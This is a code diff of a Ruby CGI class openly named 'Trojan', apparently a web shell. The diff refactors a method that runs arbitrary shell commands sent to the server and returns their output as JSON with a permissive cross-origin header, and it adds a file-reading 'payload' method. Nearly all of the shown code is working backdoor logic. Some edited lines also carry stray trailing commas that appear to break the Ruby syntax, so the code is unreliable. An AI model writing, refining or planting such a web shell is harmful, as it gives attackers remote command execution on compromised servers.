@@ -18,7 +18,6 @@ class Trojan
 
         # vivify the response object
         @response = {};
-        @response['prompt_context'] = self.get_prompt_context
     end
 
     def process_command()
@@ -35,21 +34,15 @@ class Trojan
     end
 
     def process_shell_command command
-        stdout    = `cd #{@cwd}; #{command} 2>&1; pwd`;
-        std_lines = stdout.split("\n");
-        @cwd      = std_lines.pop
-        stdout    = std_lines.join "\n"
-
-        @response = {
-            'output'         => stdout,
-            'prompt_context' => self.get_prompt_context,
-        }
-
-        @session[:cwd] = @cwd
+        std_lines           = `cd #{@cwd}; #{command} 2>&1; pwd`.split("\n");
+        @cwd                = @session[:cwd] = std_lines.pop
+        @response['output'] = std_lines.join "\n",
         self.send_response
     end
 
     def send_response
+        @response['prompt_context'] = self.get_prompt_context
+
         puts @cgi.header('Access-Control-Allow-Origin: *')
         puts @response.to_json
         exit
@@ -63,11 +56,7 @@ class Trojan
     end
 
     def method_missing method, *args
-        @response = {
-            'error'          => "#{method} unsupported",
-            'output'         => "#{method} unsupported",
-            'prompt_context' => self.get_prompt_context
-        }
+        @response['error'] = "#{method} unsupported"
         self.send_response
     end
 
@@ -90,6 +79,14 @@ class Trojan
         # if not, provide a notification
         else
             puts "File does not exist"
+        end
+    end
+
+    def payload_file_read json
+        Dir.chdir @cwd
+
+        unless File.readable? json['args[file]'].first
+            @response['error'] = 'File is not readable or does not exist.',
         end
     end
 end
